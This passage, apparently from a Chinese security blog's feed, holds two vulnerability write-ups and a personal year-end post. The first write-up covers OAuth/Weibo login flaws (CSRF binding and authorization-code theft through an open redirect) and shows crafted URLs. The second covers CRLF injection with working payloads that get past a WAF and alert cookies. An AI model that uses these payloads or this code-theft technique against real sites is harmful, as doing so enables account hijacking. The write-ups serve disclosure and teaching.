    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章将介绍WEB网站在接入第三方账号系统：新浪微博进行用户身份验证登录时会遇到的几个问题。前段时间我在乌云上报了几个与这方面相关的漏洞，后面的内容会有实际的例子进行说明，不过存在的问题都已经得到修复。</p><h2 id="新浪微博的OAuth-2-0"><a href="#新浪微博的OAuth-2-0" class="headerlink" title="新浪微博的OAuth 2.0"></a>新浪微博的OAuth 2.0</h2><p>接下来以开发者的角度来描述一下登录的过程。</p><ol><li>用户通过浏览器访问Web网站并通过希望通过新浪微博进行登录，我们需要将其引导到以下的页面：<code>https://api.weibo.com/oauth2/authorize?client_id=YOUR_CLIENT_ID&amp;response_type=code&amp;redirect_uri=YOUR_REGISTERED_REDIRECT_URI</code></li><li>用户填写微博的账号及密码，同意授权后新浪微博会将页面跳转到<code>YOUR_REGISTERED_REDIRECT_URI/?code=CODE</code></li><li>后台通过这个接口就可以拿到用户的授权码，使用这个code，我们就可以在后台通过新浪提供的API：<code>https://api.weibo.com/oauth2/access_token?client_id=YOUR_CLIENT_ID&amp;client_secret=YOUR_CLIENT_SECRET&amp;grant_type=authorization_code&amp;redirect_uri=YOUR_REGISTERED_REDIRECT_URI&amp;code=CODE</code>，获取访问用户资源的Access Token，从而使用用户的身份完成一些授权的操作，如获取微博的账号信息。</li></ol><p>而在一些网站应用中，也允许用户的账号去绑定新浪微博的账号，然后就可以通过新浪微博进行登录，例如知乎，其绑定账号的过程也是类似上面的流程。</p><p>相关链接：<a href="http://open.weibo.com/wiki/%E6%8E%88%E6%9D%83%E6%9C%BA%E5%88%B6%E8%AF%B4%E6%98%8E" target="_blank" rel="noopener">Web网站的授权</a></p><h2 id="各种姿势"><a href="#各种姿势" class="headerlink" title="各种姿势"></a>各种姿势</h2><h3 id="0x00-绑定接口的CSRF"><a href="#0x00-绑定接口的CSRF" class="headerlink" title="0x00 绑定接口的CSRF"></a>0x00 绑定接口的CSRF</h3><p>案例：<a href="http://wooyun.org/bugs/wooyun-2016-0169000" target="_blank" rel="noopener">点我的链接我就可能会进入你的B站账号</a></p><p>首先得感谢一下<a href="http://wooyun.org/whitehats/%E5%91%86%E5%AD%90%E4%B8%8D%E5%BC%80%E5%8F%A3" target="_blank" rel="noopener">@呆子不开口</a>，这个姿势是从他那里学习来的。用一句话总结一下：发起绑定第三方账号的接口存在CSRF问题，导致用户点击攻击者构造的页面后，攻击者的微博就绑定到了用户的账号下，从而造成攻击者能以受害用户的身份登录网站。接下来我将以B站之前存在的漏洞来说明构造攻击页面的过程。</p><ol><li>在攻击页面中，用户点击页后，我们要先在用户的浏览器上登录指定的微博账号。注意该账号要先授权给bilibili，因为新浪微博的授权有如下特点，如果当前登陆的微博曾经授权过bilibili，那么就会自动跳过前面的授权步骤直接完成绑定。登录微博的过程我用的方式比较简单粗暴，使用的是<code>http://weibo.cn</code>的登录接口。注：当时这个接口不需要验证码，现已加上，所以也就不存在登录CSRF的问题了。</li><li>登录微博完成后，我们利用js在页面中插入一个<code>img</code>标签，指定src为<code>https://account.bilibili.com/login?sns=weibo</code>，加载完成后，我们的微博账号就绑定到了用户的账号中。</li></ol><h3 id="0x01-没有完整验证绑定流程"><a href="#0x01-没有完整验证绑定流程" class="headerlink" title="0x01 没有完整验证绑定流程"></a>0x01 没有完整验证绑定流程</h3><p>案例：<a href="http://wooyun.org/bugs/wooyun-2016-0170272" target="_blank" rel="noopener">点我的链接我就可能会进入你的网易云音乐</a></p><p>网易云音乐的绑定微博账号流程如下：</p><ol><li>GET <code>http://music.163.com/api/sns/authorize?callbackType=Binding&amp;clientType=web2&amp;forcelogin=true&amp;snsType=2&amp;csrf_token=d0728eed66ae5189b66579d943559dc4</code></li><li>302调整到：<code>https://api.weibo.com/oauth2/authorize?client_id=301575942&amp;response_type=code&amp;redirect_uri=http://music.163.com/back/weibo&amp;scope=friendships_groups_read,statuses_to_me_read,follow_app_official_microblog&amp;state=pYkkCeJkYU&amp;forcelogin=true&amp;csrf_token=d0728eed66ae5189b66579d943559dc4</code></li><li>用户授权完成后，跳转到<code>http://music.163.com/back/weibo?state=pYkkCeJkYU&amp;code=0e9e160fbbec0955f6e04a7c79b2e5fb</code></li></ol><p>可以看到，发起绑定的接口用了<code>csrf_token</code>参数来防止CSRF攻击，因此不存在上面提到的问题。然而百密一疏，我们可以跳过第一步，直接引导用户到第二步，如果第三步<code>/back/weibo</code>这个接口没有验证state参数同时也没有验证用户是否主动发起过绑定，那么我们就可以用先登录指定微博，然后将该微博绑定到用户账号的方式，获取用户登录网易云音乐的权限。state参数就是用来防止这种情况的，然而云音乐的开发者并没有好好用上，引用一下新浪的文档：</p><blockquote><p>用于保持请求和回调的状态，在回调时，会在Query Parameter中回传该参数。开发者可以用这个参数验证请求有效性，也可以记录用户请求授权页前的位置。这个参数可用于防止跨站请求伪造（CSRF）攻击</p></blockquote><p>具体的过程如下：</p><ol><li>用户登录了网易云音乐，点击了攻击者的链接</li><li>在攻击者的页面中，主要过程是利用新浪微博的登录接口先登录攻击者的微博账号，注：攻击者的微博账号需要先授权给网易云音乐并关注，然后前端偷偷跳转到下面的地址，就可以将攻击者的微博账号绑定到用户的账号中<code>https://api.weibo.com/oauth2/authorize?client_id=301575942&amp;response_type=code&amp;redirect_uri=http://music.163.com/back/weibo&amp;scope=friendships_groups_read,statuses_to_me_read,follow_app_official_microblog</code></li><li>攻击者利用自己的微博账号即可登录受害者的网易云音乐的账号</li></ol><h3 id="0x02-用户授权code被盗"><a href="#0x02-用户授权code被盗" class="headerlink" title="0x02 用户授权code被盗"></a>0x02 用户授权code被盗</h3><p>先说一下效果，用户在微博点击我构造好的URL之后，我就可以骗到该用户的授权code，利用这个code我们就可以以用户的身份登录其授权过的某些网站。至于要怎么做到，后面我用知乎的例子来说明吧，目前也修复了。</p><p>案例链接：<a href="http://wooyun.org/bugs/wooyun-2016-0174018" target="_blank" rel="noopener">微博上你点我链接我就上你绑定过的知乎账号</a>和<a href="http://wooyun.org/bugs/wooyun-2016-0175030" target="_blank" rel="noopener">微博上你点我链接我就上你绑定过的网易通行证（涉及考拉海购/BOBO/同城约会等）</a> </p><p>在知乎上，页面中的URL链接都是使用了一个接口进行跳转的，例如我在知乎上不要脸地回答了一个问题的<a href="https://www.zhihu.com/question/37062603/answer/71139922" target="_blank" rel="noopener">答案</a>中 ，里面的URL都是类似这样子的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://link.zhihu.com/?target=http%3A//www.wooyun.org/whitehats/zhchbin</span><br></pre></td></tr></table></figure></p><p>这个URL能够跳转到任意的网址，且不需要用户确认！我们可以利用这个问题来做什么的？接下来就看我一步步构造一个恶意的URL。上面的接口是HTTPS的，而我的网站只支持HTTP，为了从<code>referrer</code>偷到用户的code信息，所以我先试了一下http是否可以，发现是没问题的。课外知识：<a href="http://serverfault.com/questions/520244/referer-is-passed-from-https-to-http-in-some-cases-how" target="_blank" rel="noopener">关于https -&gt; http 跳转的referrer</a></p><p>NEXT：知乎登录页面中的微博登录是跳转到如下的URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://api.weibo.com/oauth2/authorize?</span><br><span class="line">scope=email&amp;</span><br><span class="line">state=e9887b485320b0cab80b0d029e92759f&amp;</span><br><span class="line">redirect_uri=https%3A%2F%2Fwww.zhihu.com%2Foauth%2Fcallback%2Flogin%2Fsina&amp;</span><br><span class="line">response_type=code&amp;</span><br><span class="line">client_id=3063806388</span><br></pre></td></tr></table></figure><p>由之前的基础知识我们可以知道，要想拿到code，就得利用<code>redirect_uri</code>参数跳转到我们自己的网站。但是这里有个域名的限制，如果你把redirect_uri直接改成其他网站，微博是会报<code>(error:redirect_uri_mismatch)</code>错误的，所以我们只能使用知乎下的域名。经测试：在接入微博登录的过程中，微博开放平台会要求验证域名是否属于我们。如果填入的域名是xxx.com，则该域名和其子域名下的任何接口都能与<code>client_id</code>匹配而不会报错。而测试后我猜测知乎用的域名是<code>zhihu.com</code>，所以<code>link.zhihu.com</code>也能与client_id匹配。所以利用上面的接口，构造出以下的URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://api.weibo.com/oauth2/authorize?</span><br><span class="line">scope=email&amp;</span><br><span class="line">state=e9887b485320b0cab80b0d029e92759f&amp;</span><br><span class="line">redirect_uri=http%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttp%3A%2F%2Fa.zhchbin.xyz%2Fauth%3F&amp;</span><br><span class="line">response_type=code&amp;</span><br><span class="line">client_id=3063806388</span><br></pre></td></tr></table></figure><p>一个在授权过知乎的微博用户点击上面的URL后，新浪微博就会加上code参数并自动跳转到redirect_uri参数指定的URL。微博这样便利的默认行为，在这里帮了大忙。如果伪装的好，用户点了链接之后会根本就不知道发生了什么事情。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://link.zhihu.com/?target=http://a.zhchbin.xyz/auth?&amp;state=e9887b485320b0cab80b0d029e92759f&amp;code=776b93bbf6b2474067f593d743f36380</span><br></pre></td></tr></table></figure><p>NEXT：上面的URL页面会使用JS调整到target参数中，这个时候我们查看一下auth接口的referrer，就可以找到用户的code，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[31/Jan/2016:15:28:31 +0800] &quot;GET /auth? HTTP/1.1&quot; 404 402 &quot;http://link.zhihu.com/?target=http://a.zhchbin.xyz/auth?&amp;state=e9887b485320b0cab80b0d029e92759f&amp;code=ad3d1b20385f891a36e498cb470146e5&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36&quot; &quot;2.94&quot;</span><br></pre></td></tr></table></figure></p><p>拿到这个code参数之后，在我们自己的浏览器中打开下面的链接，就可以以受害用户的身份来登录知乎了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.zhihu.com/oauth/callback/login/sina?</span><br><span class="line">state=17324074ce785e6296061cf1381f6f8b&amp;</span><br><span class="line">code=ad3d1b20385f891a36e498cb470146e5</span><br></pre></td></tr></table></figure><p>其中state参数的值是知乎首页的cookie中_xsrf对应的值。目前知乎已经修复这个问题，具体的修复方式就没有认真研究，我觉得最好的方式是在URL跳转前加一个安全提示，让用户确认的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>可以发现OAuth2.0整个过程中都有不少容易被忽略的点，这里总结一下我认为的要写好第三方通信证登录及账号绑定需要注意的事情：</p><ol><li>发起绑定的接口不能存在CSRF问题。鬼知道用户浏览器上登录的微博账号就一定是用户的呢，你说对不。</li><li>用好OAuth2.0的State参数，用的好，就不会有上面提到的网易云音乐类似问题，还是要防止CSRF问题的。RFC中对这个参数是推荐的哦。</li><li>我觉得OAuth2.0的认证服务器在给开发者接入的时候应该要求使用完整的redirect_uri参数，而不是域名。而对于开发者，你无法改变微博的登记方式，只能让自己的站点不要存在任意URL调整的问题，比如能在跳转到其他站点前提示一下用户就提示一下。注：网易通信证那个问题，也是一个奇葩的任意URL跳转。</li></ol><p>PS：我书读得少，脑子不好使，以上内容如有错误，请和谐点指出。</p><p>最后还是要放几个链接：</p><ul><li><a href="http://drops.wooyun.org/web/12695" target="_blank" rel="noopener">http://drops.wooyun.org/web/12695</a></li><li><a href="http://weibo.com/p/1001603921767675649900?from=page_100505_profile&amp;wvr=6&amp;mod=wenzhangmod" target="_blank" rel="noopener">http://weibo.com/p/1001603921767675649900?from=page_100505_profile&amp;wvr=6&amp;mod=wenzhangmod</a></li><li><a href="https://github.com/knownsec/KCon/blob/master/KCon%20V3/%E5%88%A9%E7%94%A8OAuth%E5%8A%AB%E6%8C%81%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD.ppt" target="_blank" rel="noopener">https://github.com/knownsec/KCon/blob/master/KCon%20V3/%E5%88%A9%E7%94%A8OAuth%E5%8A%AB%E6%8C%81%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD.ppt</a></li><li><a href="http://drops.wooyun.org/papers/598" target="_blank" rel="noopener">http://drops.wooyun.org/papers/598</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这篇文章将介绍WEB网站在接入第三方账号系统：新浪微博进行用户身份验证登录时会遇到的几个问题。前段时间我在乌云上报了几个与这方面相关的漏洞，
      
    
    </summary>
    
    
      <category term="安全" scheme="http://zhchbin.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="OAuth 2.0" scheme="http://zhchbin.github.io/tags/OAuth-2-0/"/>
    
  </entry>
  
  <entry>
    <title>CRLF Injection and Bypass Tencent WAF</title>
    <link href="http://zhchbin.github.io/2016/01/31/CRLF-Injection-and-Bypass-WAF/"/>
    <id>http://zhchbin.github.io/2016/01/31/CRLF-Injection-and-Bypass-WAF/</id>
    <published>2016-01-31T06:01:31.000Z</published>
    <updated>2016-10-02T05:43:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是一篇关于HTTP Response Split（CRLF Injection）漏洞的及绕过腾讯WAF导致前端出现XSS的实例分析，个人觉得在这个过程中能学到点知识，因此整理出来分享一下，如果不感兴趣记得及时关闭页面。</p><h2 id="关于HRS问题"><a href="#关于HRS问题" class="headerlink" title="关于HRS问题"></a>关于HRS问题</h2><p>我们都知道，HTTP协议是依靠两个CRLF，即<code>\r\n</code>来分割HTTP头部及响应体。基于这个认知，可以推出，HRS问题是由于服务端程序没有过滤掉头部中的特殊字符<code>%0D%0A</code>，直接输出到了返回的数据中，导致错误的解析。而在日常开发中，最常见的莫过于有以下的两种功能（1）URL跳转（2）Cookie的设置中出现。接下来的小节里，将会以一个Cookie实例作来说明这个问题的危害。实例在：<a href="http://wooyun.org/bugs/wooyun-2016-0173904" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2016-0173904</a> ，目前腾讯已经修复了。</p><h2 id="接口说明"><a href="#接口说明" class="headerlink" title="接口说明"></a>接口说明</h2><p>这个接口在大家使用微信红包的过程中都用过，我用xxx.com代表接口的域名，具体接口的功能我就先不说，虽然危害不大。接口如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxx.com/cgi-bin/xxx/geiwofahongbaowojiugaosuni?exportkey=&amp;pass_ticket=a</span><br></pre></td></tr></table></figure></p><p>返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.6.0</span><br><span class="line">Date: Sat, 30 Jan 2016 12:08:28 GMT</span><br><span class="line">Content-Type: text/html; charset=gbk</span><br><span class="line">Content-Length: 0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: no-cache, must-revalidate</span><br><span class="line">Set-Cookie: pass_ticket=a; Domain=xxx.com; Path=/; Expires=Sun, 31-Jan-2016 12:08:28 GMT</span><br></pre></td></tr></table></figure></p><p>在微信端这个接口其实没有什么问题，因为微信客户端会把这个参数替换掉，因此攻击者填入的参数就会被直接去掉，然而在浏览器中，却导致了XSS。</p><h2 id="一步一个脚印"><a href="#一步一个脚印" class="headerlink" title="一步一个脚印"></a>一步一个脚印</h2><h4 id="0x00-插入img标签"><a href="#0x00-插入img标签" class="headerlink" title="0x00 插入img标签"></a>0x00 插入img标签</h4><p>从上面接口的返回数据中，可以看到pass_ticket参数的值出现在了Set-Cookie头部中，我们先试试能不能用插入两个CRLF，然后插入img标签。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exportkey=&amp;pass_ticket=a%0d%0a%0d%0a%3Cimg%20src=1%3E</span><br></pre></td></tr></table></figure></p><p>然而这个请求返回了空，浏览器根本不去解析body里的内容。不能放弃，通过curl分析一下，发现其实后端并没有过滤，请求都返回了，只是Content-Length为0导致浏览器认为Body为空，使用命令<code>curl -kv &lt;url&gt;</code>可以看到以下的错误提示。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* Excess found in a non pipelined read: excess = 84 url = </span><br><span class="line">  /cgi-bin/xxx/geiwofahongbaowojiugaosuni?exportkey=&amp;pass_ticket=a%0d%0a%0d%0a%3Cimg%20src=1%3E</span><br><span class="line">  (zero-length body)</span><br></pre></td></tr></table></figure></p><p>知道问题之后，我们下一步就是想方法让Content-Length的值不为0！试着在头部插入<code>Content-Length: 60</code>,得到以下的URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exportkey=&amp;pass_ticket=a%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%3E</span><br></pre></td></tr></table></figure></p><p>浏览器里访问，bingo，图片出现了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.6.0</span><br><span class="line">Date: Sat, 30 Jan 2016 12:15:03 GMT</span><br><span class="line">Content-Type: text/html; charset=gbk</span><br><span class="line">Content-Length: 60</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: no-cache, must-revalidate</span><br><span class="line">Set-Cookie: pass_ticket=a</span><br><span class="line"></span><br><span class="line">&lt;img src=1&gt;; Domain=wx.tenpay.com; Path=/; Expires=Sun, 31-J</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zhchbin/zhchbin.github.io/source/source/images/56af0f2a143cfa3753b39a38XV1CJIiq.png" alt=""></p><h4 id="0x01-尝试执行脚本"><a href="#0x01-尝试执行脚本" class="headerlink" title="0x01 尝试执行脚本"></a>0x01 尝试执行脚本</h4><p>能够插入img标签之后，我半生不熟的前端知识告诉我，src=1，图片肯定会加载失败，失败了就会有onerror的事件发生。于是，试试下面的URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exportkey=&amp;pass_ticket=a%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E</span><br></pre></td></tr></table></figure></p><p>事实告诉我们，现实并没有想象中的美好，服务器直接返回了501，这是什么原因导致的？尝试几次之后推断是被WAF拦截了。WAF是Web Application Firewall的缩写，我们的“恶意”请求被它检查出来。试了一下，发现在被和谐的的onerror和alert中间插入一些其他字符，就不会被拦截，例如：<code>on\error=al\ert(1)</code>，然而这并没有什么卵用，因为这根本就不是合法的HTML属性。</p><h4 id="0x02-Bypass-WAF"><a href="#0x02-Bypass-WAF" class="headerlink" title="0x02 Bypass WAF"></a>0x02 Bypass WAF</h4><p>有WAF，就得考虑如何绕过，然而在确认了自己的认知范围里并没有绕过的方法后，我去请教了<a href="http://www.wooyun.org/whitehats/mramydnei" target="_blank" rel="noopener">@mramydnei</a>。以下是他提供的思路及Bypass WAF的例子：</p><p>大概原理就是： </p><ol><li>插入Content-Type更改response中的charset</li><li>选择一个字符集，保证该字符集中的某个字符或字符串会被浏览器忽略（也可以是unicode transform）</li><li>将会被忽略的字符插入到被blacklist拦截的字符之间</li><li>done</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exportkey=&amp;pass_ticket=a%0D%0AContent-Length:120%0D%0AContent-Type:text/html;%20charset=ISO-2022-JP%0D%0A%0D%0A%3Cimg%20src=x%20on%1B%28Jerror=al%1B%28Jert%28document.domain%29%3E</span><br></pre></td></tr></table></figure><p>看到他的回复后，我只有一个想法：人要有敬畏之心！后来找了一下，在Chrome的Issue List找到了一些相关的讨论，<a href="https://crbug.com/114941" target="_blank" rel="noopener">https://crbug.com/114941</a></p><h4 id="0x03-绕过浏览器的XSS过滤"><a href="#0x03-绕过浏览器的XSS过滤" class="headerlink" title="0x03 绕过浏览器的XSS过滤"></a>0x03 绕过浏览器的XSS过滤</h4><p>由于是反射型的XSS，Chrome里直接访问的时候会发现它拦截了脚本的执行，虽然在firefox里是可行的。从上面中的分析过程中，我们可以知道一个事情：可以在返回的头部的信息里插入任何头部信息！这看上去很赞，于是就想起了Chrome的XSS过滤是可以被关闭的，只要你返回的头部中带有<code>X-XSS-Protection:0</code>，构造URL如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exportkey=&amp;pass_ticket=a%0D%0AContent-Length:120%0D%0AX-XSS-Protection:0%0D%0AContent-Type:text/html;%20charset=ISO-2022-JP%0D%0A%0D%0A%3Cimg%20src=x%20on%1B%28Jerror=%22al%1B%28Jert%28document.co%1B%28Jokie%29%22%3E</span><br></pre></td></tr></table></figure><p>点击后可以看到页面弹出了用户的Cookie，好了。虽然我们的<code>xxx.com</code>只是它的某个子域，这里的Cookie却弹出了其他子域名的，为什么呢？因为前端用了<code>document.domain = xx.com</code>。</p><p><img src="https://raw.githubusercontent.com/zhchbin/zhchbin.github.io/source/source/images/56af08cb143cfae54c9777d4NE61bZEx.png" alt=""></p><h2 id="最后说几句"><a href="#最后说几句" class="headerlink" title="最后说几句"></a>最后说几句</h2><p>在这个过程中，你学到了什么呢？反思这个过程，我觉得是信息量好大。对于我们做开发的，我认为最重要的一点是，用户的输入都是不可信的（这句话已经被无数人说过无数次了应该）。另外我读了一下Python Web框架里的一些代码，发现有些框架已经帮我们处理掉部分问题，例如在Flask中调用设置Cookie的相关接口中，<code>werkzeug</code>会使用白名单的机制检查每个byte，如果发现恶意字符，则将输入的值中用双引号包围起来，同时还有转义一部分字符，具体代码在这里：<a href="https://github.com/mitsuhiko/werkzeug/blob/master/werkzeug/_internal.py#L222" target="_blank" rel="noopener">https://github.com/mitsuhiko/werkzeug/blob/master/werkzeug/_internal.py#L222</a> 。</p><p>放几个参考链接：</p><ol><li><a href="https://en.wikipedia.org/wiki/HTTP_response_splitting" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/HTTP_response_splitting</a></li><li><a href="http://blog.bentkowski.info/2014/07/google-doodle-xss-actually-response.html" target="_blank" rel="noopener">http://blog.bentkowski.info/2014/07/google-doodle-xss-actually-response.html</a> </li><li><a href="http://drops.wooyun.org/papers/2466" target="_blank" rel="noopener">http://drops.wooyun.org/papers/2466</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这是一篇关于HTTP Response Split（CRLF Injection）漏洞的及绕过腾讯WAF导致前端出现XSS的实例分析，个人觉
      
    
    </summary>
    
    
      <category term="安全" scheme="http://zhchbin.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="http://zhchbin.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>2015的无聊总结</title>
    <link href="http://zhchbin.github.io/2015/12/26/2015-summary/"/>
    <id>http://zhchbin.github.io/2015/12/26/2015-summary/</id>
    <published>2015-12-26T11:12:31.000Z</published>
    <updated>2016-10-02T05:43:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>又是一年要结束了，又到了该总结一下过去一年的收获，也许明天会更好吧。妈蛋，原来去年没有写总结，怪不得觉得有很多事情要写，但时间都对不上。</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li>2月份在家过完年很早就回到学校，完成一件很久之前一直要做但没敢去做的事情</li><li>3，4，5月调整心情，在学校写毕业设计，5月份答辩完</li><li>6月份毕业啦，在中大六年的生活就此落幕</li><li>7月份开始工作了，人生开始变化，而我却还是那个我，波澜不惊的生活</li><li>10月份开始培养业务爱好，除去美剧，日漫后另一个可以用来消磨时间的事情</li></ul><h3 id="毕业设计和毕业典礼"><a href="#毕业设计和毕业典礼" class="headerlink" title="毕业设计和毕业典礼"></a>毕业设计和毕业典礼</h3><p>我用心做了吗？没有。我用心写了吗？没有。毕设题目我现在好像已经快忘记得差不多，当时盲审的时候出来的结果居然有个B，被打回来修改后找导师签名才能过的那种，周围人都是一次性过，还好当时心态摆得比较平，只要不是不通过，我改就是了。后来当然就是答辩了，还算顺利，我被安排在下午。老师们估计也是听着觉得没意思，随便问了几个问题就过去了。早上在那里等了一个上午，结果轮到自己估计15分钟都不用就完事了，中间还没有去吃饭一直在那里准备！印象最深的是结束答辩后朋友圈刷起了“今天是个好日子”的歌！！哈哈！毕业设计算是给自己两年研究生生活的交代吧，虽然事后觉得很少，但是事前周围大家都渲染了恐怖的气氛，压力多少还是有一些的。</p><p>完成毕业设计之后迎来的当然是估计这辈子都不会再有的猪一样的生活了，那段时间可以无忧无虑地在校园里享受最后的大学时光，每天想去打球就去打球，一周估计有三次吧！当然后果就是：在越来越黑的路上越走越远啊。打完球一身汗坐在篮球场上仰望星空，等待一切该发生的事情。学院毕业那天随便过去拍拍照就完了，感觉天太热叫朋友来一起拍照太麻烦，我还是选择跟本科毕业一样低调了事。学院请吃饭那晚也没记得什么，心态变得很平淡，估计是老了吧。学校毕业典礼那天跟校长握了一下手，没有做什么突出的事情，也安安静静地结束了。</p><h3 id="关于工作"><a href="#关于工作" class="headerlink" title="关于工作"></a>关于工作</h3><p>华丽丽地从一个学生仔变成社会人士，很庆幸的是我们这一行的圈子不需要太多的转变，最大的变化无非就是以前待在实验室，现在要每天待到办公室里面对电脑屏幕敲键盘。还有就是不能再任性的想几点起床就几点起床，晚上睡觉都要多告诉自己一声明天要上班，每逢周一心情会跟大家一样Down，周五下班有种释然的感觉。工作算轻松的吧，压力不大，部门还有一堆喜欢运动的同事，每周可以打球。唯一觉得该提的一件事就是新人转正的一个必要条件，在某个打字软件上速度要达到60。好吧，每天上班前练习40分钟到一个小时，中午休息的时候练一个小时，晚上下班后在公司练一个小时，回来后在自己电脑上再练多一会，最后总算有惊无险地通过。</p><h3 id="这一年的业余爱好"><a href="#这一年的业余爱好" class="headerlink" title="这一年的业余爱好"></a>这一年的业余爱好</h3><ol><li>看NBA，印象深刻的是雷霆最后进不了季后赛，感叹了一声：当你的命运掌握在别人的手里，再努力也没用。另外一个就是支持的球队金州勇士最后拿下了总冠军！以后有机会一定要去现场看一次NBA的比赛！</li><li>追剧，小说，电影等。这一年追的美剧不少啊，苦逼的IT创业者之《硅谷》，民风淳朴的《哥谭》，各种奇怪能力的《神盾局特工》，每集都高潮迭起的《逍遥法外》，最喜欢的当数《黑客军团》，至今仍然印象深刻的对白：”You cry sometimes… Just like me. Because you are lonely. I don’t just hack you, Krista. I hack everyone – My friends, coworkers. But I’ve helped a lot of people. I want … A way out of loneliness… Just like you.”。我还记得看了《一公升的眼泪》，是的，每集都会流一公升的眼泪。对了，每晚睡觉前我还拿起了当年买的kindle看小说，看完了《肖申克的救赎》，半本《盗墓笔记》，《三体》，《三体II：黑暗森林》等。还追了一些日漫，有点多就不一一列举。当然，我学习也没有落下的，浏览完了几本技术书，也偶尔更新下博客。</li><li>业务安全爱好者，从10月份起就在漏洞平台乌云上提交一些漏洞，等级从一个路人刷到了白帽子。黑客？我当然是个好人，引用别人一句话：“我提交漏洞，大多为了名利和自我价值实现，这些已让我有足够动机，不掺杂任何崇高的白帽子精神。”</li></ol><h3 id="值得吹牛的事情"><a href="#值得吹牛的事情" class="headerlink" title="值得吹牛的事情"></a>值得吹牛的事情</h3><ol><li>给一个公司报告了一个他们软件上某个功能的Bug，得到了1000刀的奖励。钱虽然不多，但发现我的邮件里只写了几十个字，大概知识就是财富吧，哈哈。</li><li>来自陌生人的红包：前段时间有上海某公司的一个人加我，发了我个200RMB的红包，另外还有一个北京某教育类创业公司CTO也加我微信给我发了66 RMB的红包。</li></ol><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>明显这一年过得挺奇怪的，送给自己一句话，希望明年有所改变：生于忧患死于安乐。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;又是一年要结束了，又到了该总结一下过去一年的收获，也许明天会更好吧。妈蛋，原来去年没有写总结，怪不得觉得有很多事情要写，但时间都对不上。&lt;/p&gt;
&lt;h2 id=&quot;Timeline&quot;&gt;&lt;a href=&quot;#Timeline&quot; class=&quot;headerlink&quot; title=&quot;
      
    
    </summary>
    
    
      <category term="Life" scheme="http://zhchbin.github.io/tags/Life/"/>
    
  </entry>
  
  <entry>
